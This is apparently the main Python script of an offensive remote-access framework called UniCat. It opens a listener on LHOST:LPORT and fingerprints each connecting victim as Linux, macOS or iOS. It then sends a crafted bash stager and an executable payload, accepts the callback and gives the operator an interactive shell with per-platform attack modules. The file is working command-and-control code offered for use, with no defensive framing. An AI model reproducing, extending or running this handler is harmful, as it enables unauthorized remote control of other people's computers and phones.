#!/usr/bin/env python3

import socket
import struct
import sys
import os

from time import sleep
from datetime import datetime

from core.handler import handler
from core.badges import badges
from core.helper import helper
from core.unicorn import unicorn
from core.crafter import crafter

class UniCat:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.crafter = crafter()

    def get_module(self, mu, name, folderpath):
        folderpath_list = folderpath.split(".")
        for i in dir(mu):
            if i == name:
                pass
                return getattr(mu, name)
            else:
                if i in folderpath_list:
                    i = getattr(mu, i)
                    return self.get_module(i, name, folderpath)

    def import_modules(self, path):
        modules = dict()
    
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                md = path.replace("/", ".").replace("\\", ".") + "." + mod[:-3]
                mt = __import__(md)
            
                m = self.get_module(mt, mod[:-3], md)
                m = m.UnicornModule(unicorn)
            
                modules[m.name] = m
        return modules

    def load_modules(self):
        global universal_commands, target_commands
        universal_commands = self.import_modules("modules/universal")
        target_commands = self.import_modules("modules/" + target_system)

    def help(self):
        self.helper.show_commands(universal_commands, target_commands)

    def shell(self):
        username = unicorn.send_command("username")
        hostname = unicorn.send_command("hostname")
        while True:
            try:
                command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
                while not command.strip():
                    command = str(input("({}{}@{}{})> ".format(self.badges.GREEN, username, hostname, self.badges.RESET)))
                command = command.strip()
                arguments = "".join(command.split(command.split(" ")[0])).strip()
                command = command.split(" ")
                if command[0] == "help":
                    self.help()
                elif command[0] == "exit":
                    print(self.badges.G + "Cleaning up...")
                    unicorn.send_command("exit", None, False)
                    c.close()
                    s.close()
                    sys.exit()
                elif command[0] == "exec":
                    if len(command) < 2:
                        print("Usage: exec <command>")
                    else:
                        print(self.badges.I + "exec:")
                        os.system(arguments)
                        print("")
                elif command[0] == "clear":
                    os.system("clear")
                else:
                    if command[0] in universal_commands.keys():
                        if len(command) < int(universal_commands[command[0]].args):
                            print(universal_commands[command[0]].usage)
                        else:
                            universal_commands[command[0]].run(arguments)
                    else:
                        if command[0] in target_commands.keys():
                            if len(command) < int(target_commands[command[0]].args):
                                print(target_commands[command[0]].usage)
                            else:
                                target_commands[command[0]].run(arguments)
                        else:
                            print(self.badges.E + "Unrecognized command!")
            except (KeyboardInterrupt, EOFError):
                print("")
            except socket.error:
                print(self.badges.E +"Connection closed!")
                c.close()
                s.close()
                sys.exit()
            except UnicodeEncodeError:
                print(self.badges.E + "Failed to read command buffer!")
                print("")
            except Exception as e:
                print(self.badges.E +"An error occurred: "+str(e)+"!")

    def server(self, LHOST, LPORT, handler=handler):
        global s, a, c, unicorn, target_system
    
        print(self.badges.G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((LHOST, LPORT))
            s.listen(1)
        except:
            print(self.badges.E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
            try:
                s.close()
            except:
                pass
            sys.exit()

        try:
            print(self.badges.G + "Listening on port " + str(LPORT) + "...")
            c, a = s.accept()
            print(self.badges.G + "Connecting to " + a[0] + "...")

            c.send((self.helper.get_arch).encode())
            device_arch = c.recv(128).decode().strip()
            c.send((self.helper.get_system).encode())
            device_os = c.recv(128).decode().strip()
        
            if device_os == "Linux":
                target_system = "Linux"
            elif device_os == "Darwin" and device_arch == "i386":
                target_system = "macOS"
            elif device_os == "Darwin" and device_arch in ["arm64", "armv7s", "arm"]:
                target_system = "iOS"
            else:
                target_system = "Unknown"
        
            bash_stager, executable = self.crafter.craft_payload(LHOST, LPORT, target_system)
        
            c.send(bash_stager.encode())
            c.send(executable)
            c.close()

            print(self.badges.G + "Establishing connection...")
            c, a = s.accept()

            unicorn = None
            unicorn = unicorn(handler(c))
            self.load_modules()
            self.shell()
        except (KeyboardInterrupt, EOFError):
            print("")
            sys.exit()
